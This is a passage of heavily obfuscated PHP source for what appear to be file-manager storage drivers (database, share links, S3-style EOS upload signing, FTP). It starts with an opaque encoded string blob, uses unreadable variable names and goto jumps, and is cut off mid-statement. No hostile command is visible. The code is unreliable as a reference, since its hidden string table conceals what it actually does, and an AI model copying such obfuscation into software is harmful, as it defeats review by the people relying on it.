ŸIDƒ0Ä¸ä9+"áL/æzFP)»I').base64_decode('Sdk4vFJejJiyJEROw0/02o4pEu8IuN8PIPIBeuR3nPzhqlgGSVeniH1POR8kIYkEzA==').base64_decode('vIlCDdLln/PulXtKLyO3JSMsJZNSzEkd+sVGmyHhg4Ik02uNwLDG3by4SzkfBpduag==').strrev('§1è×ˆ‚(pß;ÖGy‰üR§İÁ-8,6´ëé^ˆû¶|1XVbPâq—åƒ!“')."\46\331\55\13\363\2\175\304\375\20\260\117\266\165\166\144\54\207\12\273\146\251\274\270\226\21\335\304\260\112\335\47\13\315\131\134\266\233\346\110\45\100\364\111\11\256\326\40\235"."\244\260\336\207\320\167\240\135\341\2\3\361\111\247\225\66\317\306\347\14\345\41\106\111\136\7\324\165\66\304\262\31\306\166\270\222\54\371\21\137\347\5\254\54\301\220\120\100\317"."\x86\xa5\xea\xe4\xcb\xd9\x9\xb\xc4\x2a\x7f\x44\x60\xa5\x73\x88\x25\xf3\x76\x91\xc0\x76\x48\xb9\x16\x7\x89\xe4\x1d\x83\x9c\x51\x39\xd1\xd1\x1c\xf7\xd4\x92\x63\x8d\x40\x5f\xa\xcc\x11\xc1\x30\x4d"."\13\70\223\150\176\335\325\172\271\200\273\147\264\204\65\142\330\311\1\351\254\125\236\130\16\57\226\15\52\174\250\162\173\335\255\142\143\352\76\201\212\112\312\332\43\151\170\304\315"."\12\145\150\213\52\26\243\111\270\244\340\171\35\145\47\30\2\134\226\46\341\262\145\311\254\260\44\260\221\312\331\132\311\232\240\173\345\203\7\122\214\124\205\16\273\316\372\64\353"."\104\343\131\61\163\371\347\0\343\334\271\211\330\243\162\53\204\264\302\165\323\136\251\25\25\63\117\330\12\221\333\265\13\124\242\265\54\245\2\165\245\224\143\102\355\23\241\221\121".base64_decode('TuZFWgX9EPpJvIXLPqwqJMvKJpXVUaIVKYPl1BNxweVxAxeoNML0ydBpNGsMCj08pg==').strrev('=9’'."\r".'WcVzSòƒ²Áàh­•y$¾q¢sjËœ{¢â*Ä³P””·É¼ÁùKşAÅ?†').strrev('“p²…òÃ„á"ú\'ÖH„ú'."\r".'”T1èpÉ!@r]#	+$}4VWek®Ô‘¶™V')."\x41\x2f\x41\x5b\xf1\x65\x3b\xbf\xfe\x22\x6e\x57\xe9\xb6\x4b\x93\x63\x66\xd1\xf6\xe0\xb4\xb8\x59\x20\xbf\x2d\xa6\x6d\xb\xa5\x0\x2a\x3a\x20\xbc\x22\xde\x3b\x3d\x92\xce\xb\xa\x89\xbb\x2e\xdc\x28".base64_decode('colC0JZQHxKE61h8Jo/pNJXQLEcEX87wiLw1wrVse8l1cSwA6ACcMEeZ/yhshy/aIw==')."\256\157\64\67\77\50\130\31\100\105\131\203\207\170\73\260\374\64\305\17\17\43\170\111\35\360\42\232\157\125\41\343\50\116\337\222\342\232\266\337\124\3\210\160\105\25\324\53\72"."\x91\xad\x81\xe9\x50\x2c\x1e\x2b\x4b\xea\xe\xc4\x62\x4b\x23\xd1\x36\xea\x44\xbd\x2c\x99\x94\x92\x34\xa2\xca\x92\xba\x3b\x22\x5d\x13\xa5\x5\x3b\x3\xa1\x70\x59\x1a\x56\x9e\xea\x52\x85\x27\x32\x9a"."\24\352\46\255\44\67\220\23\265\42\324\272\110\264\204\334\165\213\233\201\302\200\311\4\376\354\346\44\246\145\231\34\100\62\341\325\163\302\5\235\50\343\24\157\310\363\152\61\137".base64_decode('kTzgfJHIpaPIEBYqwopPXVB3tABQ7FSer3vOc4vLe5/jkl+Ck7VBiI2Ec/KeTABTKw==')."\16\220\54\125\56\277\345\40\251\142\0\160\303\26\232\240\65\267\312\114\110\267\30\364\304\3\126\262\60\244\222\162\33\15\73\222\155\55\123\361\256\233\112\17\361\352\27\162\275"."\377\13\305\200\264\210\325\255\0\0".strrev('').base64_decode('').strrev(''), 10, -8))); goto fß¡ŞÜĞèª; a¦ÙŞ¹Áò‡: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Ò¾Ê€ù) { $this->pathParse = $Ò¾Ê€ù; $this->model = Model($_SERVER[–Ú¬çÁ][1352]); } public function getPath($Êöº‡¿Ù) { return trim($Êöº‡¿Ù, $_SERVER[–Ú¬çÁ][8]); } public function pathFather($¼Ô¬õ¥ó) { $ò•Ìòòß = $this->parse($¼Ô¬õ¥ó); $ò•Ìòòß = $this->infoSimple($¼Ô¬õ¥ó); return $ò•Ìòòß ? $ò•Ìòòß[$_SERVER[–Ú¬çÁ][180]] : !1; } public function pathThis($²Â‘ÑÔö) { $Ëâ¿ ×¼ = $this->infoSimple($²Â‘ÑÔö); return $Ëâ¿ ×¼ ? $Ëâ¿ ×¼[$_SERVER[–Ú¬çÁ][32]] : !1; } public function getPathOuter($ùŠæš‡•) { if (!$ùŠæš‡•) { return $ùŠæš‡•; } $ì­Ã½Ûâ = $this->parse($ùŠæš‡•); return KodIO::make($ì­Ã½Ûâ[$_SERVER[–Ú¬çÁ][452]]); } public function copyFolderFromIO($ÑıÜ²¥•, $©Ñ÷›Õõ, $®œ ğè®, $©‚½…ñ–, $ÜíÒ‡„) { $®Íƒç´‡ = $this->model->copyFolderFromIO($ÑıÜ²¥•, $©Ñ÷›Õõ, $®œ ğè®, $©‚½…ñ–, $ÜíÒ‡„); return KodIO::make($®Íƒç´‡); } public function isParentOf($áˆö•º¬, $Àáñ±¬ğ) { return $this->model->isParentOf($áˆö•º¬, $Àáñ±¬ğ); } public function mkfile($Ù˜Œã´õ, $Óğ«¼õ× = '', $¦í¬µŒã = REPEAT_RENAME) { $­ÏÛÚ©æ =& $_SERVER[–Ú¬çÁ]; $ã‘Ü€ŸÔ = $this->parse($Ù˜Œã´õ); $Ù˜Œã´õ = $ã‘Ü€ŸÔ[$­ÏÛÚ©æ[452]]; for ($ƒ™ÄÛ÷œ = 0; $ƒ™ÄÛ÷œ < count($ã‘Ü€ŸÔ[$­ÏÛÚ©æ[1353]]); $ƒ™ÄÛ÷œ++) { $îÁè“ÊÂ = $ã‘Ü€ŸÔ[$­ÏÛÚ©æ[1353]][$ƒ™ÄÛ÷œ]; if ($ƒ™ÄÛ÷œ == count($ã‘Ü€ŸÔ[$­ÏÛÚ©æ[1353]]) - 1) { $Ù˜Œã´õ = $this->model->mkfile($Ù˜Œã´õ, $îÁè“ÊÂ, $Óğ«¼õ×, $¦í¬µŒã); break; } $Ù˜Œã´õ = $this->model->mkdir($Ù˜Œã´õ, $îÁè“ÊÂ, REPEAT_SKIP); } return $this->getPathOuter($Ù˜Œã´õ); } public function mkdir($ÖÜâß¶, $Òşß¿æ¯ = REPEAT_SKIP) { $œ§‹ùœñ =& $_SERVER[–Ú¬çÁ]; $ÜôŒ³Õö = $this->parse($ÖÜâß¶); $ÖÜâß¶ = $ÜôŒ³Õö[$œ§‹ùœñ[452]]; for ($ÃÈûÚ = 0; $ÃÈûÚ < count($ÜôŒ³Õö[$œ§‹ùœñ[1353]]); $ÃÈûÚ++) { $ë„×ı© = $ÜôŒ³Õö[$œ§‹ùœñ[1353]][$ÃÈûÚ]; $ÖÜâß¶ = $this->model->mkdir($ÖÜâß¶, $ë„×ı©, $Òşß¿æ¯); } return $this->getPathOuter($ÖÜâß¶); } public function copyFile($»÷ÓÆÑì, $Şû‹™» , $¤Ú£Àª  = REPEAT_REPLACE) { $•²ÓõæÀ =& $_SERVER[–Ú¬çÁ]; $ò¥èÆªÓ = $this->parse($Şû‹™» ); $Œßï­áÊ = $this->model->copy($»÷ÓÆÑì, $ò¥èÆªÓ[$•²ÓõæÀ[452]], $¤Ú£Àª , $ò¥èÆªÓ[$•²ÓõæÀ[84]]); return $Œßï­áÊ ? $this->getPathOuter($Œßï­áÊ) : !1; } public function moveFile($Ö–é«×, $Ó¾¹ŞÄå, $Ô“‡Øöé = REPEAT_REPLACE) { $ÃÄÏğ°ş =& $_SERVER[–Ú¬çÁ]; $—Ì»«ò— = $this->parse($Ó¾¹ŞÄå); $‡ƒ‹˜¡õ = $this->model->move($Ö–é«×, $—Ì»«ò—[$ÃÄÏğ°ş[452]], $Ô“‡Øöé, $—Ì»«ò—[$ÃÄÏğ°ş[84]]); return $‡ƒ‹˜¡õ ? $this->getPathOuter($‡ƒ‹˜¡õ) : !1; } public function copy($©ˆ‹¦­, $×ó„„, $¿’¦Êıâ = REPEAT_REPLACE, $ìß‚˜Çƒ = false) { $ŸŠàˆÍŒ = $this->parse($×ó„„); $¨´ ŞĞ = $this->model->copy($©ˆ‹¦­, $ŸŠàˆÍŒ[$_SERVER[–Ú¬çÁ][452]], $¿’¦Êıâ, $ìß‚˜Çƒ); return $¨´ ŞĞ ? $this->getPathOuter($¨´ ŞĞ) : !1; } public function moveSameAllow() { } public function move($ªé¯ê€¸, $úİíüª, $Ù…í†Æ¤ = REPEAT_REPLACE, $´ÒÃéã = false) { $›Ó†ì¾§ = $this->parse($úİíüª); $Á·¸Î×— = $this->model->move($ªé¯ê€¸, $›Ó†ì¾§[$_SERVER[–Ú¬çÁ][452]], $Ù…í†Æ¤, $´ÒÃéã); return $Á·¸Î×— ? $this->getPathOuter($Á·¸Î×—) : !1; } public function remove($°©›îé, $Ï†»ãÆ = true) { return $this->model->remove($°©›îé, $Ï†»ãÆ); } public function rename($˜šæ¿Ş£, $š½¤º¬) { $ÒõÛ­ŒÆ = $this->model->rename($˜šæ¿Ş£, $š½¤º¬); return $ÒõÛ­ŒÆ ? $this->getPathOuter($˜šæ¿Ş£) : $ÒõÛ­ŒÆ; } public function size($ÇğöäÔñ) { $ÊüÊ©íÒ = $this->infoSimple($ÇğöäÔñ); return $ÊüÊ©íÒ ? $ÊüÊ©íÒ[$_SERVER[–Ú¬çÁ][76]] : 0; } public function infoSimple($¥Õ¾´“Í) { return $this->model->sourceInfo($¥Õ¾´“Í); } public function info($Á³Û™€ñ) { return $this->infoParse($Á³Û™€ñ); } public function infoAuth($³¯öâû¬) { return $this->infoParse($³¯öâû¬, !1, !0); } public function infoWithChildren($Ó÷¡øÍƒ) { return $this->infoParse($Ó÷¡øÍƒ, !0); } protected function infoParse($âÂœæÖø, $Ù¬æ£Â° = false, $Ù˜Ø¨ = false) { if (!$Ù¬æ£Â°) { return $this->model->pathInfo($âÂœæÖø, $Ù˜Ø¨); } return $this->model->pathInfoMore($âÂœæÖø); } public function infoFullSimple($›‘Óş§Î) { $Ã©ºÄ©ç =& $_SERVER[–Ú¬çÁ]; $À…ÉÓØá = explode($Ã©ºÄ©ç[8], $›‘Óş§Î); $ëÄ›È’Î = implode($Ã©ºÄ©ç[8], array_splice($À…ÉÓØá, 1)); return $this->model->pathInfoByPath($À…ÉÓØá[0], $ëÄ›È’Î); } public function infoFull($äÓĞæ´¢) { $ûÆğ˜¹á = $this->infoFullSimple($äÓĞæ´¢); return is_array($ûÆğ˜¹á) ? $this->model->pathInfo($ûÆğ˜¹á[$_SERVER[–Ú¬çÁ][181]]) : !1; } public function hashSimple($Î¹ÙÙ«ß) { $ÍÅáÄˆ« =& $_SERVER[–Ú¬çÁ]; $˜œàŠ¯é = $this->infoWithChildren($Î¹ÙÙ«ß); return $˜œàŠ¯é[$ÍÅáÄˆ«[526]][$ÍÅáÄˆ«[650]]; } public function hashMd5($™–Šª¾») { $¸¡“ª„” =& $_SERVER[–Ú¬çÁ]; $‚™Ä¬ñ« = $this->infoWithChildren($™–Šª¾»); return $‚™Ä¬ñ«[$¸¡“ª„”[526]][$¸¡“ª„”[524]]; } public function exist($¥¸’‘ª§) { $º‹ÈçÙ =& $_SERVER[–Ú¬çÁ]; $îÚ¹ƒÄµ = $this->parse($¥¸’‘ª§); if (!$îÚ¹ƒÄµ[$º‹ÈçÙ[84]]) { return $this->isFile($¥¸’‘ª§) || $this->isFolder($¥¸’‘ª§); } $Ã›şÙİ™ = array($º‹ÈçÙ[454] => $îÚ¹ƒÄµ[$º‹ÈçÙ[452]], $º‹ÈçÙ[32] => $îÚ¹ƒÄµ[$º‹ÈçÙ[84]]); $Âïˆ²Êì = $this->model->where($Ã›şÙİ™)->find(); return $Âïˆ²Êì ? !0 : !1; } public function isFile($øÇö¾ù) { $•ßú’è =& $_SERVER[–Ú¬çÁ]; $´Ğ­”ø = $this->infoSimple($øÇö¾ù); return $´Ğ­”ø && $´Ğ­”ø[$•ßú’è[462]] == $•ßú’è[222] ? !0 : !1; } public function isFolder($Ş¸ÅÒĞ‚) { $µ¯„õ¸Á =& $_SERVER[–Ú¬çÁ]; $ã Üìõ’ = $this->infoSimple($Ş¸ÅÒĞ‚); return $ã Üìõ’ && $ã Üìõ’[$µ¯„õ¸Á[462]] == $µ¯„õ¸Á[88] ? !0 : !1; } public function listPath($©§ú˜ÌÕ, $›ÁŠ²é‰ = false) { $À­ÓÓğÖ =& $_SERVER[–Ú¬çÁ]; if ($©§ú˜ÌÕ == $À­ÓÓğÖ[12]) { return !1; } $æó« áä = array($À­ÓÓğÖ[454] => $©§ú˜ÌÕ); if ($›ÁŠ²é‰) { return $this->model->listSource($æó« áä, -1); } return $this->model->listSource($æó« áä); } public function has($Ç…„ÊÇ, $Öã÷Ö‡ = false, $ £Ş¹øŸ = null) { $Õ…½Ü¤ê =& $_SERVER[–Ú¬çÁ]; $¹Ş„ßæ = $this->infoWithChildren($Ç…„ÊÇ); if ($Öã÷Ö‡) { return array($Õ…½Ü¤ê[234] => $¹Ş„ßæ[$Õ…½Ü¤ê[234]], $Õ…½Ü¤ê[233] => $¹Ş„ßæ[$Õ…½Ü¤ê[233]]); } return $ £Ş¹øŸ ? $¹Ş„ßæ[$Õ…½Ü¤ê[234]] : $¹Ş„ßæ[$Õ…½Ü¤ê[233]]; } public function listAll($±ÎÔåş) { $‰İû°ÂÛ = IO::info($this->pathParse[$_SERVER[–Ú¬çÁ][84]]); if (!$‰İû°ÂÛ) { return array(); } return $this->model->listAll($±ÎÔåş); } public function getContent($ì‰„é®¸) { return $this->model->getContent($ì‰„é®¸); } public function setContent($”œ¾ÊÁ¼, $‰íè¾Ü€ = '') { return $this->model->setContent($”œ¾ÊÁ¼, $‰íè¾Ü€); } public function fileSubstr($‚¥Èûİˆ, $·£ÔåÜå, $™ê‘šˆ¾) { return $this->model->fileSubstr($‚¥Èûİˆ, $·£ÔåÜå, $™ê‘šˆ¾); } public function download($ªïòàı, $Ñşºµ£ = '') { $¤˜èï… = get_path_father($Ñşºµ£); $¯¡ŒÈ¾› = get_path_this($Ñşºµ£); $ì¨ÜÙõá = $this->model->fileInfoGet($ªïòàı); $˜ø£ÈÖ¬ = IO::copy($ì¨ÜÙõá[$_SERVER[–Ú¬çÁ][84]], $¤˜èï…, !1, $¯¡ŒÈ¾›); return $˜ø£ÈÖ¬; } public function setModifyTime($„Œ ¶®¾, $ÑÜŠ£€º = '') { $Á­«ÇÜ =& $_SERVER[–Ú¬çÁ]; if (!$„Œ ¶®¾) { return; } $this->model->where(array($Á­«ÇÜ[468] => $„Œ ¶®¾))->save(array($Á­«ÇÜ[85] => $ÑÜŠ£€º)); } public function upload($¢¤¦É‡, $ÈÅ‘çÀ¬, $ì”Û¢Û¸ = false, $ÓšÍ¼› = REPEAT_REPLACE) { $üéÕß§ß =& $_SERVER[–Ú¬çÁ]; $—ÙÁŠôÔ = $this->parse($¢¤¦É‡); $»Í‘§Ëæ = $this->model->addFile($—ÙÁŠôÔ[$üéÕß§ß[452]], $ÈÅ‘çÀ¬, $—ÙÁŠôÔ[$üéÕß§ß[84]], $ì”Û¢Û¸, $ÓšÍ¼›); return $this->getPathOuter($»Í‘§Ëæ); } public function uploadFileByID($£“ µáú, $Äï˜úú…, $³““úú) { $­åîšÂ =& $_SERVER[–Ú¬çÁ]; $‡µñĞ’ = $this->parse($£“ µáú); $‘Ò¸Şçµ = $this->model->addFileByFileID($‡µñĞ’[$­åîšÂ[452]], $Äï˜úú…, $‡µñĞ’[$­åîšÂ[84]], $³““úú); return $this->getPathOuter($‘Ò¸Şçµ); } public function addFileByRemote($ôË—Ò¯”, $äãúØë, $œŞÜ”±¶ = array(), $îÛÛõñ = '', $ãªì•Í£) { $ßõŸå” =& $_SERVER[–Ú¬çÁ]; $´û‘ƒ•„ = $this->parse($ôË—Ò¯”); $îÛÛõñ = empty($îÛÛõñ) ? $´û‘ƒ•„[$ßõŸå”[84]] : $îÛÛõñ; $€—ºäËË = $this->model->addFileByRemote($´û‘ƒ•„[$ßõŸå”[452]], $äãúØë, $îÛÛõñ, $œŞÜ”±¶, $ãªì•Í£); return $this->getPathOuter($€—ºäËË); } public function uploadLink($ŸÊšÌ§Ù, $”¥§´å… = 0) { $ï£×‚í =& $_SERVER[–Ú¬çÁ]; $Œ§–´× = $this->parse($ŸÊšÌ§Ù); $ë‚İŞ· = _get($GLOBALS[$ï£×‚í[7]], $ï£×‚í[1354]); $‚’ı¨ê• = _get($GLOBALS[$ï£×‚í[7]], $ï£×‚í[1355]); $ŸÊšÌ§Ù = Model($ï£×‚í[652])->createFileName($Œ§–´×[$ï£×‚í[84]], $ë‚İŞ·, $‚’ı¨ê•); return IO::uploadLink($ŸÊšÌ§Ù, $”¥§´å…); } public function fileNameAuto($ÚôïóĞ, $Æ Šò¾œ, $—ÆÅş¥ = REPEAT_REPLACE, $Õ‚åàÉÉ = false) { return $this->model->fileNameAuto($ÚôïóĞ, $Æ Šò¾œ, $—ÆÅş¥, $Õ‚åàÉÉ); } public function fileNameExist($É¢ôõÙ, $² –À) { return $this->model->fileNameExist($É¢ôõÙ, $² –À); } protected function _fileOut($ƒéİŒ¤Ğ, $ï½ÛäÂ¤ = false, $ëˆå²Ç = false, $ğø©ƒ»Õ = '', $Ê¾ÉÖ—ì = false) { $êœü½½ =& $_SERVER[–Ú¬çÁ]; $İ•ß·ƒú = $this->model->sourceInfo($ƒéİŒ¤Ğ); if ($İ•ß·ƒú[$êœü½½[462]] == $êœü½½[88]) { header($êœü½½[1356]); die; } $äáÍø¦¹ = $this->model->fileInfoGet($ƒéİŒ¤Ğ); $ğø©ƒ»Õ = $äáÍø¦¹[$êœü½½[524]] ? $äáÍø¦¹[$êœü½½[524]] : $ğø©ƒ»Õ; $Ç¦ÒÔ = is_array($GLOBALS[$êœü½½[169]]) ? $GLOBALS[$êœü½½[169]][$êœü½½[32]] : $İ•ß·ƒú[$êœü½½[32]]; if ($Ê¾ÉÖ—ì) { return IO::fileOutServer($äáÍø¦¹[$êœü½½[84]], $ï½ÛäÂ¤, $Ç¦ÒÔ, $ğø©ƒ»Õ); } IO::fileOut($äáÍø¦¹[$êœü½½[84]], $ï½ÛäÂ¤, $Ç¦ÒÔ, $ğø©ƒ»Õ); } public function fileOut($úãÊª •, $ÄğÄ˜¬‘ = false, $¨¾×æŒµ = false, $èùóÓ†Û = '') { $this->_fileOut($úãÊª •, $ÄğÄ˜¬‘, $¨¾×æŒµ, $èùóÓ†Û); } public function fileOutServer($¦Ò¼ÀÍ , $Ğµ¼¥ = false, $¢¨ÍÒ±Ş = false, $Ÿá°ç– = '') { $this->_fileOut($¦Ò¼ÀÍ , $Ğµ¼¥, $¢¨ÍÒ±Ş, $Ÿá°ç–, !0); } protected function _fileOutImage($Ÿ Óßï×, $—Ÿ©ŸÂÌ = 250) { $÷›Çæ“ =& $_SERVER[–Ú¬çÁ]; $Ù¶¢ˆË = $this->model->pathInfo($Ÿ Óßï×); if ($Ù¶¢ˆË[$÷›Çæ“[462]] == $÷›Çæ“[88]) { show_json($÷›Çæ“[1357] . $Ÿ Óßï×, !1); } $œöœóÜ = $this->model->fileInfoGet($Ÿ Óßï×); $Ù¶¢ˆË[$÷›Çæ“[170]] = $œöœóÜ[$÷›Çæ“[84]]; $GLOBALS[$÷›Çæ“[169]] = $Ù¶¢ˆË; IO::fileOutImage($œöœóÜ[$÷›Çæ“[84]], $—Ÿ©ŸÂÌ); } public function fileOutImage($²¡œ±ƒ™, $ªßÇÆÃ´ = 250) { $this->_fileOutImage($²¡œ±ƒ™, $ªßÇÆÃ´); } public function fileOutImageServer($©½òº¦æ, $Šòœ”øŸ = 250) { $this->_fileOutImage($©½òº¦æ, $Šòœ”øŸ); } public function link($Ê½×«—î, $ŠäïŠµ… = '') { $à¾ş…ç” = $this->model->fileInfoGet($Ê½×«—î); return IO::link($à¾ş…ç”[$_SERVER[–Ú¬çÁ][84]], $ŠäïŠµ…); } protected function parse($İáúù“) { $±˜Ó¢‰¬ =& $_SERVER[–Ú¬çÁ]; if (strstr($İáúù“, $±˜Ó¢‰¬[8]) === !1) { return array($±˜Ó¢‰¬[470] => intval($İáúù“), $±˜Ó¢‰¬[84] => $±˜Ó¢‰¬[12], $±˜Ó¢‰¬[1353] => array()); } $©ºáÉÀ = explode($±˜Ó¢‰¬[8], trim($İáúù“, $±˜Ó¢‰¬[8])); if (count($©ºáÉÀ) < 2) { show_tips(clear_html($İáúù“) . $±˜Ó¢‰¬[1358]); } return array($±˜Ó¢‰¬[470] => intval($©ºáÉÀ[0]), $±˜Ó¢‰¬[84] => $©ºáÉÀ[1], $±˜Ó¢‰¬[1353] => array_slice($©ºáÉÀ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($¨ÀùÈÄö) { $this->pathParse = $¨ÀùÈÄö; $this->model = Model($_SERVER[–Ú¬çÁ][1352]); } public function getPathOuter($ÜÊãÚ‹Ù) { $ÓÜÖĞº© =& $_SERVER[–Ú¬çÁ]; if (!$ÜÊãÚ‹Ù) { return $ÜÊãÚ‹Ù; } $¿™ ÀŸ = $this->parse($ÜÊãÚ‹Ù); return trim(KodIO::makeShare($this->pathParse[$ÓÜÖĞº©[452]], $¿™ ÀŸ[$ÓÜÖĞº©[452]]), $ÓÜÖĞº©[8]); } protected function infoParse($‰øÀôÁ, $öì¢Ï›Ú = false, $¾ÜÈ÷™„ = false) { $™Éˆ¦İå =& $_SERVER[–Ú¬çÁ]; $”Ö°ö§ï = $this->pathParse[$™Éˆ¦İå[452]]; $³Ã§êã¾ = trim($this->pathParse[$™Éˆ¦İå[1188]], $™Éˆ¦İå[8]); return Action($™Éˆ¦İå[1359])->sharePathInfo($”Ö°ö§ï, $³Ã§êã¾, $öì¢Ï›Ú); } public function infoFull($¶ÔÇ¹±’) { $€ú°­˜ =& $_SERVER[–Ú¬çÁ]; $¢•Ó¨æÉ = explode($€ú°­˜[8], trim($¶ÔÇ¹±’, $€ú°­˜[8])); if (count($¢•Ó¨æÉ) > 1) { $‹¦ú”¤‰ = implode($€ú°­˜[8], array_splice($¢•Ó¨æÉ, 1)); $Ù«ØÉ© = $this->model->pathInfoByPath($¢•Ó¨æÉ[0], $‹¦ú”¤‰); if (!$Ù«ØÉ©) { return !1; } $this->pathParse[$€ú°­˜[1188]] = $Ù«ØÉ©[$€ú°­˜[181]]; } return $this->infoParse($¶ÔÇ¹±’); } public function listAll($¤²’œ½ø) { $€¶’œ‘œ =& $_SERVER[–Ú¬çÁ]; $â›î¦Å = IO::info($this->pathParse[$€¶’œ‘œ[84]]); if (!$â›î¦Å) { return array(); } $Úšë½©± = $this->model->listAll($¤²’œ½ø); $›Í­•½ç = Model($€¶’œ‘œ[642])->getInfo($â›î¦Å[$€¶’œ‘œ[643]]); foreach ($Úšë½©± as &$µ³¬®¹) { check_abort(); $µ³¬®¹[$€¶’œ‘œ[87]] = Action($€¶’œ‘œ[1359])->_shareItemeParse($µ³¬®¹[$€¶’œ‘œ[87]], $›Í­•½ç); } unset($µ³¬®¹); return $Úšë½©±; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ÚæŸö ×) { $this->pathParse = $ÚæŸö ×; $this->model = Model($_SERVER[–Ú¬çÁ][1352]); } protected function infoParse($×ìÊ‚¼ñ, $×Èáéö = false, $ğİÁŒİ = false) { $ğ™›Ğİ® =& $_SERVER[–Ú¬çÁ]; return Action($ğ™›Ğİ®[1194])->sharePathInfo($this->pathParse[$ğ™›Ğİ®[84]], !0, $×Èáéö); } public function listPath($€ãéÆ‘, $û´ÔáŠª = false) { $şÚË‡ûè =& $_SERVER[–Ú¬çÁ]; $¤–õ‹¼© = parent::listPath($€ãéÆ‘, $û´ÔáŠª); if (!$¤–õ‹¼©) { return $¤–õ‹¼©; } if (is_array($¤–õ‹¼©[$şÚË‡ûè[1360]])) { $¤–õ‹¼©[$şÚË‡ûè[1360]] = Action($şÚË‡ûè[1194])->shareItemInfo($¤–õ‹¼©[$şÚË‡ûè[1360]]); } foreach ($¤–õ‹¼© as $Ó—Ø§ã => $É¼°Ò¶) { if (!in_array($Ó—Ø§ã, array($şÚË‡ûè[83], $şÚË‡ûè[82]))) { continue; } foreach ($É¼°Ò¶ as $³—ÛÂ»Õ => $Ç”ûë§Î) { $¤–õ‹¼©[$Ó—Ø§ã][$³—ÛÂ»Õ] = Action($şÚË‡ûè[1194])->shareItemInfo($Ç”ûë§Î); } } return $¤–õ‹¼©; } public function listAll($™›£İõ) { $‹ã½ÇÏ =& $_SERVER[–Ú¬çÁ]; $“šğ™Ô­ = IO::info($this->pathParse[$‹ã½ÇÏ[84]]); if (!$“šğ™Ô­) { return array(); } $îÊû—ô = $this->model->listAll($™›£İõ); foreach ($îÊû—ô as &$‰Èü“æ) { $‰Èü“æ[$‹ã½ÇÏ[87]] = Action($‹ã½ÇÏ[1194])->shareItemInfo($‰Èü“æ[$‹ã½ÇÏ[87]]); } unset($‰Èü“æ); return $îÊû—ô; } } goto BÉô…ó¨«Ã; EŞíù†µç: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($³»…©Åï) { parent::__construct($³»…©Åï); $this->signatureVersion($_SERVER[–Ú¬çÁ][241]); } public function uploadFormData($©ö§°³õ, $šÊ„ªå˜ = 3600) { $Ìµ°–ß  =& $_SERVER[–Ú¬çÁ]; $Ô•½ = $Ìµ°–ß [223]; $şµ¡¸Íğ = $Ìµ°–ß [262]; $Å¦èÇÇô = $Ìµ°–ß [62]; $ø™ï¶“º = gmdate($Ìµ°–ß [263]); $´Á­£²Á = gmdate($Ìµ°–ß [264]); $’°Ã÷Ó¬ = $Ìµ°–ß [265]; $°‚ÚÅ¶‹ = $šÊ„ªå˜ . $Ìµ°–ß [12]; $ô¹Í«ìŠ = $Ìµ°–ß [266]; $¯õˆÛâª = array($this->accessKey, $´Á­£²Á, $this->region, $Å¦èÇÇô, $’°Ã÷Ó¬); $¯Ø÷²åŞ = implode($Ìµ°–ß [8], $¯õˆÛâª); $­Îøóû¤ = array($Ìµ°–ß [267] => gmdate($Ìµ°–ß [1344], strtotime($Ìµ°–ß [269])), $Ìµ°–ß [270] => array(array($Ìµ°–ß [271] => $this->bucket), array($Ìµ°–ß [272] => $Ô•½), array($Ìµ°–ß [273], $Ìµ°–ß [274], $Ìµ°–ß [12]), array($Ìµ°–ß [273], $Ìµ°–ß [275], $Ìµ°–ß [12]), array($Ìµ°–ß [273], $Ìµ°–ß [276], $Ìµ°–ß [12]), array($Ìµ°–ß [277] => $ô¹Í«ìŠ), array($Ìµ°–ß [278] => $¯Ø÷²åŞ), array($Ìµ°–ß [279] => $şµ¡¸Íğ), array($Ìµ°–ß [280] => $ø™ï¶“º), array($Ìµ°–ß [281] => $°‚ÚÅ¶‹))); $ûü Ö = base64_encode(json_encode($­Îøóû¤)); $Ä´ö¬„„ = hash_hmac($Ìµ°–ß [282], $´Á­£²Á, $Ìµ°–ß [283] . $this->secret, !0); $“úñÇ­  = hash_hmac($Ìµ°–ß [282], $this->region, $Ä´ö¬„„, !0); $ÒüÏ¿¡² = hash_hmac($Ìµ°–ß [282], $Å¦èÇÇô, $“úñÇ­ , !0); $§ã¥Œè = hash_hmac($Ìµ°–ß [282], $’°Ã÷Ó¬, $ÒüÏ¿¡², !0); $”‰ÔÒŒü = hash_hmac($Ìµ°–ß [282], $ûü Ö, $§ã¥Œè); $‚ôü‹È  = array($Ìµ°–ß [240] => $Ìµ°–ß [12], $Ìµ°–ß [284] => $Ìµ°–ß [12], $Ìµ°–ß [272] => $Ô•½, $Ìµ°–ß [277] => $ô¹Í«ìŠ, $Ìµ°–ß [285] => $ûü Ö, $Ìµ°–ß [286] => $¯Ø÷²åŞ, $Ìµ°–ß [287] => $şµ¡¸Íğ, $Ìµ°–ß [288] => $ø™ï¶“º, $Ìµ°–ß [289] => $°‚ÚÅ¶‹, $Ìµ°–ß [290] => $”‰ÔÒŒü, $Ìµ°–ß [196] => $this->getHost()); return $‚ôü‹È ; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($öñÂ“Ù) { parent::__construct(); if (count($öñÂ“Ù) > 0) { $this->_init($öñÂ“Ù); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($âáÖñ¯Ï) { $Â†€·‹ =& $_SERVER[–Ú¬çÁ]; global $config; $this->appCharset = $config[$Â†€·‹[1370]]; $this->systemCharset = $config[$Â†€·‹[1371]]; if (isset($âáÖñ¯Ï[$Â†€·‹[1372]]) && $âáÖñ¯Ï[$Â†€·‹[1372]]) { $this->systemCharset = $âáÖñ¯Ï[$Â†€·‹[1372]]; } } public function iconvApp($Ñ‹…„Ç) { return $this->iconvTo($Ñ‹…„Ç, $this->systemCharset, $this->appCharset); } public function iconvSystem($ôÖ™Öíœ) { return $this->iconvTo($ôÖ™Öíœ, $this->appCharset, $this->systemCharset); } public function getPathOuter($Şû²Êî‘) { $‰ãˆ¡­Û =& $_SERVER[–Ú¬çÁ]; $©ÃˆÚéº = $this->iconvApp($this->pathBase); $Şû²Êî‘ = $this->iconvApp($Şû²Êî‘); if (substr($©ÃˆÚéº, 0, 2) == $‰ãˆ¡­Û[1373]) { $©ÃˆÚéº = BASIC_PATH . substr($©ÃˆÚéº, 2); } if 